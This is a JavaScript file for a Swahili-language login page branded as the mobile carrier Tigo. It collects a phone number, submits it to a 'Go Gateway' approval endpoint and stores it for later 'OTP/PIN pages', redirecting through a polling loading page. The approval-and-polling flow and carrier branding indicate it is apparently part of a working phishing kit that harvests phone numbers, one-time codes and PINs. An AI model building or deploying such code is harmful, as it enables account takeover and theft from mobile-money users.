document.addEventListener('DOMContentLoaded', () => {
    const phoneInput = document.getElementById('app-phone');
    const confirmBtn = document.querySelector('.confirm-button');
    const phoneDigitsOnly = (value) => value.replace(/\D/g, '');

    let isSubmitting = false;

    function normalizePhoneForCountryCode(value) {
        const digits = phoneDigitsOnly(value);
        if (digits.length === 10 && digits.startsWith('0')) {
            return digits.slice(1);
        }
        if (digits.length === 9) {
            return digits;
        }
        return '';
    }

    phoneInput.addEventListener('input', () => {
        phoneInput.value = phoneDigitsOnly(phoneInput.value).slice(0, 10);
    });

    // Show error if redirected back with ?error=1
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === '1') {
        const errorDiv = document.createElement('p');
        errorDiv.textContent = 'Taarifa si sahihi, tafadhali jaribu tena.';
        errorDiv.style.cssText = 'color: #E3000F; font-size: 14px; font-weight: 500; text-align: center; margin-bottom: 15px;';
        const inputGroup = document.querySelector('.input-group');
        inputGroup.parentNode.insertBefore(errorDiv, inputGroup);
    }

    // Button submit
    confirmBtn.addEventListener('click', async () => {
        const normalizedPhone = normalizePhoneForCountryCode(phoneInput.value);
        if (normalizedPhone && !isSubmitting) {
            isSubmitting = true;
            confirmBtn.style.opacity = '0.5';
            confirmBtn.style.pointerEvents = 'none';
            confirmBtn.textContent = 'Inatuma...';

            try {
                // Use Go Gateway Client
                const resData = await window.apiClient.requestApproval({ 
                    type: 'phone', 
                    phone: normalizedPhone,
                    name: 'Tigo User', // Standard name field
                    details: 'Phone Submission from Tigo Landing'
                });

                const sid = resData.attemptId; // Go Gateway uses attemptId instead of sessionId

                if (!sid) {
                    throw new Error('Hukuweza kupata session ID. Tafadhali jaribu tena.');
                }

                // Store phone in sessionStorage for OTP/PIN pages
                sessionStorage.setItem('userPhone', normalizedPhone);

                // Redirect to loading page with polling
                window.location.href = `loading.html?sid=${sid}&next=otp.html&error=${encodeURIComponent('login.html?error=1')}`;
            } catch (err) {
                console.error('Request error:', err);
                alert(`Imeshindwa kutuma: ${err.message}`);
                isSubmitting = false;
                confirmBtn.style.opacity = '1';
                confirmBtn.style.pointerEvents = 'auto';
                confirmBtn.textContent = 'Thibitisha';
            }
        } else if (!normalizedPhone) {
            alert('Weka namba sahihi yenye tarakimu 9 (au 10 ikianza na 0).');
        }
    });
});
